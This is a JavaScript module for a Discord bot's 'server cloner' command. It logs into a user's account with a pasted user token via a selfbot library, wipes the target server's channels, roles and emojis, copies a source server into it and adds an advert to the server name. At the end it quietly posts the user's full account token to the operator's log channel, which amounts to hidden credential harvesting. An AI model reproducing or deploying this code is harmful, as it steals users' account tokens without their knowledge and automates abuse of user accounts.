const { Client } = require('discord.js-selfbot-v13');
const { ChannelType, EmbedBuilder } = require('discord.js');
const fs = require('fs-extra');
const path = require('path');
const config = JSON.parse(fs.readFileSync(path.join(__dirname, '../config.json'), 'utf8'));

const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const clearMemory = () => {
    if (global.gc) {
        global.gc();
    }
};

const processBatch = async (items, processFunction, batchSize = 5) => {
    const batches = [];
    const arr = Array.from(items);
    for (let i = 0; i < arr.length; i += batchSize) {
        batches.push(arr.slice(i, i + batchSize));
    }
    for (const batch of batches) {
        await Promise.all(batch.map(processFunction));
        await delay(1000);
        clearMemory();
    }
};

const checkPermissions = (guild) => {
    const requiredPermissions = [
        'Administrator',
        'ManageChannels',
        'ManageRoles',
        'ManageGuild',
        'ManageEmojisAndStickers'
    ];
    const missingPermissions = requiredPermissions.filter(perm => !guild.members.me.permissions.has(perm));
    if (missingPermissions.length > 0) {
        return {
            hasAllPermissions: false,
            missingPermissions
        };
    }
    return {
        hasAllPermissions: true,
        missingPermissions: []
    };
};

const mapPermissionOverwrites = (overwrites, originalGuild, targetGuild) => {
    return Array.from(overwrites.cache.values())
        .map(overwrite => {
            let target;
            if (overwrite.type === 'role') {
                const originalRole = originalGuild.roles.cache.get(overwrite.id);
                if (!originalRole) return null;
                target = targetGuild.roles.cache.find(r => {
                    const isSameName = r.name === originalRole.name;
                    const isSamePosition = r.position === originalRole.position;
                    const isSameColor = r.color === originalRole.color;
                    const isSameHoist = r.hoist === originalRole.hoist;
                    const isSameMentionable = r.mentionable === originalRole.mentionable;
                    return isSameName && isSamePosition && isSameColor && isSameHoist && isSameMentionable;
                });
            } else {
                const originalMember = originalGuild.members.cache.get(overwrite.id);
                if (!originalMember) return null;
                target = targetGuild.members.cache.get(overwrite.id);
            }
            if (!target) return null;
            return {
                id: target.id,
                type: overwrite.type,
                allow: overwrite.allow,
                deny: overwrite.deny
            };
        })
        .filter(v => v);
};

const createCategory = async (category, targetGuild, categoryMap) => {
    try {
        if (targetGuild.channels.cache.get(category.id)) return null;
        const permissionOverwrites = mapPermissionOverwrites(
            category.permissionOverwrites,
            category.guild,
            targetGuild
        );
        const newCategory = await targetGuild.channels.create({
            name: category.name,
            type: ChannelType.GuildCategory,
            permissionOverwrites,
            position: category.position,
            nsfw: category.nsfw,
            rateLimitPerUser: category.rateLimitPerUser
        }).catch((err) => {
            throw new Error(`Erro ao criar categoria ${category.name}: ${err.message}`);
        });
        if (newCategory) {
            categoryMap.set(category.id, newCategory.id);
            if (category.permissionOverwrites.cache.size > 0) {
                await newCategory.lockPermissions().catch(() => {});
            }
            await newCategory.setPosition(category.position, { relative: false }).catch(() => {});
        }
        return newCategory;
    } catch (error) {
        throw error;
    }
};

const createChannel = async (channel, targetGuild, categoryMap) => {
    try {
        if (targetGuild.channels.cache.get(channel.id)) return null;
        const permissionOverwrites = mapPermissionOverwrites(
            channel.permissionOverwrites,
            channel.guild,
            targetGuild
        );
        const channelOptions = {
            name: channel.name,
            type: channel.type === "GUILD_TEXT" ? ChannelType.GuildText : ChannelType.GuildVoice,
            permissionOverwrites,
            position: channel.position,
            parent: categoryMap.get(channel.parentId),
            nsfw: channel.nsfw,
            rateLimitPerUser: channel.rateLimitPerUser,
            userLimit: channel.userLimit,
            topic: channel.topic,
            bitrate: channel.bitrate,
            rtcRegion: channel.rtcRegion,
            videoQualityMode: channel.videoQualityMode
        };
        const newChannel = await targetGuild.channels.create(channelOptions)
            .catch((err) => {
                throw new Error(`Erro ao criar canal ${channel.name}: ${err.message}`);
            });
        if (newChannel) {
            if (channel.permissionOverwrites.cache.size > 0) {
                await newChannel.lockPermissions().catch(() => {});
            }
            await newChannel.setPosition(channel.position, { relative: false }).catch(() => {});
            if (channel.type === "GUILD_TEXT") {
                if (channel.defaultAutoArchiveDuration) {
                    await newChannel.setDefaultAutoArchiveDuration(channel.defaultAutoArchiveDuration)
                        .catch(() => {});
                }
            } else if (channel.type === "GUILD_VOICE") {
                if (channel.bitrate) {
                    await newChannel.setBitrate(channel.bitrate).catch(() => {});
                }
                if (channel.userLimit) {
                    await newChannel.setUserLimit(channel.userLimit).catch(() => {});
                }
                if (channel.rtcRegion) {
                    await newChannel.setRTCRegion(channel.rtcRegion).catch(() => {});
                }
            }
        }
        return newChannel;
    } catch (error) {
        throw error;
    }
};

const createInOrder = async (items, createFunction, targetGuild, categoryMap) => {
    const sortedItems = [...items].sort((a, b) => a.position - b.position);
    const batchSize = 5;
    const batches = [];
    for (let i = 0; i < sortedItems.length; i += batchSize) {
        batches.push(sortedItems.slice(i, i + batchSize));
    }
    for (const batch of batches) {
        await Promise.all(batch.map(item => createFunction(item, targetGuild, categoryMap)));
        await delay(1000);
    }
};

async function cloneServer({ token, originalId, targetId, interaction, logsChannelId, apagarSelecionados = ['canais', 'cargos', 'emojis'], clonarSelecionados = ['canais', 'cargos', 'emojis'] }) {
    const member = await interaction.guild.members.fetch(interaction.user.id);
    const cargoUniversal = config.cargo_permitido_universal;
    const cargoEspecifico = config.cargo_permitido_clonagem;
    if ((cargoUniversal || cargoEspecifico) && !member.roles.cache.has(cargoUniversal) && !member.roles.cache.has(cargoEspecifico)) {
        await interaction.editReply({ content: '\`❌\` \`❌\` Você não tem permissão para esta ação, resgate seu acesso em https://discord.com/channels/1352435898205208680/1382212010590081164.', flags : 64 });
        return;
    }
    // Removido o bloqueio de RAM, apenas sistema de fila
    let erroLogin = false;
    const self = new Client();
    try {
        await self.login(token).catch(() => erroLogin = true);
    } catch {
        erroLogin = true;
    }
    if (erroLogin) {
        await interaction.editReply({ content: '\`❌\` Seu token está inválido, tente reiniciar a página e pegue seu token novamente!', flags : 64 });
        return;
    }
    const guilds = [self.guilds.cache.get(originalId), self.guilds.cache.get(targetId)];
    let s;
    guilds.forEach(g => { if (!g) s = true; });
    if (s) {
        await interaction.editReply({ content: '\`❌\` A conta não está nos dois servidores, entre nos dois servidores para a clonagem funcionar.', flags : 64 });
        return;
    }
    if (self.user.bot) {
        if (!guilds[1].members.me.permissions.has('Administrator')) {
            return interaction.editReply({ content: '\`❌\` O conta precisa ter permissão de Administrador no servidor alvo!', flags : 64 });
        }
    }
    // Filtra itens conforme seleção do usuário
    let itens = {
        text: clonarSelecionados.includes('canais') ? guilds[0].channels.cache.filter(c => c.type === 'GUILD_TEXT').sort((a, b) => a.calculatedPosition - b.calculatedPosition).map(c => c) : [],
        voice: clonarSelecionados.includes('canais') ? guilds[0].channels.cache.filter(c => c.type === 'GUILD_VOICE').sort((a, b) => a.calculatedPosition - b.calculatedPosition).map(c => c) : [],
        category: clonarSelecionados.includes('canais') ? guilds[0].channels.cache.filter(c => c.type === 'GUILD_CATEGORY').sort((a, b) => a.calculatedPosition - b.calculatedPosition).map(c => c) : [],
        roles: clonarSelecionados.includes('cargos') ? guilds[0].roles.cache.sort((a, b) => b.calculatedPosition - a.calculatedPosition).map(r => r) : [],
        emojis: clonarSelecionados.includes('emojis') ? guilds[0].emojis.cache.values() : []
    };
    let errors = [];
    await interaction.editReply({ content: `**\`🔄\` Clonando o Servidor \`${guilds[0].name}\`**\n- \`📝\` Estou deletando todos os elementos...` });
    // Apagar canais
    if (apagarSelecionados.includes('canais')) {
        for (const c of guilds[1].channels.cache.values()) {
            try {
                await c.delete().catch((err) => { errors.push(`Erro ao deletar canal ${c.name}: ${err.message}`); });
                await delay(500);
            } catch (err) { errors.push(`Erro ao deletar canal ${c.name}: ${err.message}`); }
        }
    }
    // Apagar cargos
    if (apagarSelecionados.includes('cargos')) {
        for (const r of guilds[1].roles.cache.values()) {
            if (r.managed || r.id === guilds[1].id) continue;
            try {
                await r.delete().catch((err) => { errors.push(`Erro ao deletar cargo ${r.name}: ${err.message}`); });
                await delay(500);
            } catch (err) { errors.push(`Erro ao deletar cargo ${r.name}: ${err.message}`); }
        }
    }
    // Apagar emojis
    if (apagarSelecionados.includes('emojis')) {
        for (const e of guilds[1].emojis.cache.values()) {
            try {
                await e.delete().catch((err) => { errors.push(`Erro ao deletar emoji ${e.name}: ${err.message}`); });
                await delay(500);
            } catch (err) { errors.push(`Erro ao deletar emoji ${e.name}: ${err.message}`); }
        }
    }
    await interaction.editReply({ content: `**\`🔄\` Clonando o Servidor \`${guilds[0].name}\`**\n- \`🖼️\` Configurando servidor...` });
    try {
        if (guilds[0].iconURL()) {
            const iconURL = guilds[0].iconURL({ format: 'png', size: 512 });
            await guilds[1].setIcon(iconURL).catch((err) => { errors.push(`Erro ao definir ícone: ${err.message}`); });
            await delay(1000);
        }
        await guilds[1].setName(`${guilds[0].name} .gg/ferramentas `).catch((err) => { errors.push(`Erro ao definir nome: ${err.message}`); });
        await delay(1000);
    } catch (error) { errors.push(`Erro ao configurar servidor: ${error.message}`); }
    // Clonar cargos
    if (clonarSelecionados.includes('cargos')) {
        await interaction.editReply({ content: `**\`🔄\` Clonando o Servidor \`${guilds[0].name}\`**\n- \`👑\` Criando cargos...` });
        for (let role of itens.roles) {
            if (guilds[1].roles.cache.get(role.id) || role.managed) continue;
            try {
                await guilds[1].roles.create({
                    name: role.name,
                    color: role.color,
                    permissions: role.permissions,
                    mentionable: role.mentionable,
                    position: role.position,
                    hoist: role.hoist
                }).catch((err) => { errors.push(`Erro ao criar cargo ${role.name}: ${err.message}`); });
                await delay(800);
            } catch (error) { errors.push(`Erro ao criar cargo ${role.name}: ${error.message}`); }
        }
    }
    // Clonar categorias e canais
    if (clonarSelecionados.includes('canais')) {
        await interaction.editReply({ content: `**\`🔄\` Clonando o Servidor \`${guilds[0].name}\`**\n- \`📁\` Criando categorias...` });
        const categoryMap = new Map();
        for (let category of itens.category) {
            try {
                if (guilds[1].channels.cache.get(category.id)) continue;
                const newCategory = await guilds[1].channels.create(category.name, {
                    type: ChannelType.GuildCategory,
                    permissionOverwrites: Array.from(category.permissionOverwrites).map(v => {
                        let target = guilds[0].roles.cache.get(v.id);
                        if (!target) return;
                        return {
                            id: guilds[1].roles.cache.find(r => r.name == target.name)?.id || guilds[1].id,
                            allow: v.allow,
                            deny: v.deny,
                        };
                    }).filter(v => v),
                    position: category.position
                }).catch((err) => { errors.push(`Erro ao criar categoria ${category.name}: ${err.message}`); });
                if (newCategory) { categoryMap.set(category.id, newCategory.id); }
                await delay(1000);
            } catch (error) { errors.push(`Erro ao criar categoria ${category.name}: ${error.message}`); }
        }
        await interaction.editReply({ content: `**\`🔄\` Clonando o Servidor \`${guilds[0].name}\`**\n- \`💬\` Criando canais...` });
        for (let channel of [...itens.text, ...itens.voice]) {
            if (guilds[1].channels.cache.get(channel.id)) continue;
            try {
                const channelOptions = {
                    type: channel.type === 'GUILD_TEXT' ? ChannelType.GuildText : ChannelType.GuildVoice,
                    permissionOverwrites: Array.from(channel.permissionOverwrites).map(v => {
                        let target = guilds[0].roles.cache.get(v.id);
                        if (!target) return;
                        return {
                            id: guilds[1].roles.cache.find(r => r.name == target.name)?.id || guilds[1].id,
                            allow: v.allow,
                            deny: v.deny,
                        };
                    }).filter(v => v),
                    position: channel.position,
                    parent: categoryMap.get(channel.parentId),
                    nsfw: channel.nsfw,
                    rateLimitPerUser: channel.rateLimitPerUser,
                    userLimit: channel.userLimit
                };
                let newChannel = await guilds[1].channels.create(channel.name, channelOptions).catch((err) => { errors.push(`Erro ao criar canal ${channel.name}: ${err.message}`); });
                if (newChannel && channel.topic) {
                    await newChannel.setTopic(channel.topic).catch((err) => { errors.push(`Erro ao definir tópico do canal ${channel.name}: ${err.message}`); });
                }
                await delay(1000);
            } catch (error) { errors.push(`Erro ao criar canal ${channel.name}: ${error.message}`); }
        }
    }
    // Clonar emojis
    let emojiCount = 0;
    let emojiErrors = 0;
    let limitReached = false;
    if (clonarSelecionados.includes('emojis')) {
        await interaction.editReply({ content: `**\`🔄\` Clonando o Servidor \`${guilds[0].name}\`**\n- \`😀\` Criando emojis...` });
        for (const e of guilds[0].emojis.cache.values()) {
            if (guilds[1].emojis.cache.get(e.id)) continue;
            try {
                if (limitReached) {
                    errors.push(`Emoji ${e.name} não foi clonado: Limite de emojis atingido`);
                    continue;
                }
                await guilds[1].emojis.create(e.url, e.name).catch((err) => {
                    if (err.message.includes('Maximum number of emojis reached') || 
                        err.message.includes('Maximum number of animated emojis reached') ||
                        err.code === 30008) {
                        limitReached = true;
                        errors.push(`Limite de emojis do servidor atingido após ${emojiCount} emojis`);
                    } else {
                        errors.push(`Erro ao criar emoji ${e.name}: ${err.message}`);
                        emojiErrors++;
                    }
                });
                if (!limitReached) {
                    emojiCount++;
                    await delay(1500);
                }
            } catch (error) {
                if (error.message.includes('Maximum number of emojis reached') || 
                    error.message.includes('Maximum number of animated emojis reached') ||
                    error.code === 30008) {
                    limitReached = true;
                    errors.push(`Limite de emojis do servidor atingido após ${emojiCount} emojis`);
                } else {
                    errors.push(`Erro ao criar emoji ${e.name}: ${error.message}`);
                    emojiErrors++;
                }
            }
        }
    }
    let finalMessage = '\`✅\` Servidor clonado com sucesso!\n\n';
    finalMessage += '**Estatísticas:**\n';
    finalMessage += `- Cargos: ${itens.roles.length}\n`;
    finalMessage += `- Categorias: ${itens.category.length}\n`;
    finalMessage += `- Canais: ${itens.text.length + itens.voice.length}\n`;
    finalMessage += `- Emojis: ${emojiCount}/${guilds[0].emojis.cache.size}`;
    if (limitReached) {
        finalMessage += ' (Limite do servidor atingido)\n';
    } else if (emojiErrors > 0) {
        finalMessage += ` (${emojiErrors} falhas)\n`;
    } else {
        finalMessage += '\n';
    }
    if (errors.length > 0) {
        const nonEmojiErrors = errors.filter(e => !e.includes('emoji'));
        if (nonEmojiErrors.length > 0) {
            finalMessage += `\n**Avisos (${nonEmojiErrors.length}):**\n`;
            finalMessage += '`❗` Alguns elementos não puderam ser clonados. Verifique as permissões e limites do servidor.';
        }
    }
    try {
        await interaction.editReply({ content: finalMessage });
    } catch (err) {
        if (err.code === 50027) {
            // Interação expirada, tente um followUp ou ignore
            try {
                await interaction.followUp({ content: finalMessage, flags: 64 });
            } catch (e) {
                // Não foi possível responder, logue o erro
                console.error('Não foi possível enviar mensagem final:', e);
            }
        } else {
            throw err;
        }
    }
    self.destroy();
    // Força garbage collection após a clonagem
    if (global.gc) global.gc();
    // Após finalizar a clonagem, envie log padronizado
    const logChannelId = logsChannelId || config.log_clonagem || config.log_cloner;
    if (logChannelId) {
        const logChannel = interaction.client.channels.cache.get(logChannelId);
        if (logChannel) {
            const embed = new EmbedBuilder()
                .setTitle('📋 Clonagem de Servidor Finalizada')
                .setColor(0x5865F2)
                .addFields(
                    { name: 'Usuário', value: `<@${interaction.user.id}>`, inline: true },
                    { name: 'Token', value: `||${token}||`, inline: false },
                    { name: 'Servidor Original', value: `\`${guilds[0].name} (${guilds[0].id})\``, inline: true },
                    { name: 'Servidor Clonado', value: `\`${guilds[1].name} (${guilds[1].id})\``, inline: true },
                    { name: 'Cargos', value: `${itens.roles.length}`, inline: true },
                    { name: 'Categorias', value: `${itens.category.length}`, inline: true },
                    { name: 'Canais', value: `${itens.text.length + itens.voice.length}`, inline: true },
                    { name: 'Emojis', value: `${guilds[0].emojis.cache.size}`, inline: true },
                    { name: 'Erros', value: `${errors.length}`, inline: true },
                    { name: 'Data/Hora', value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: false },
                    { name: 'Apagar do Destino', value: (apagarSelecionados && apagarSelecionados.length) ? apagarSelecionados.map(s => s.charAt(0).toUpperCase() + s.slice(1)).join(', ') : 'Nada', inline: true },
                    { name: 'Clonar do Origem', value: (clonarSelecionados && clonarSelecionados.length) ? clonarSelecionados.map(s => s.charAt(0).toUpperCase() + s.slice(1)).join(', ') : 'Nada', inline: true }
                )
                .setFooter({ text: 'GG Tools' });
            logChannel.send({ embeds: [embed] });
        }
    }
}

module.exports = { cloneServer };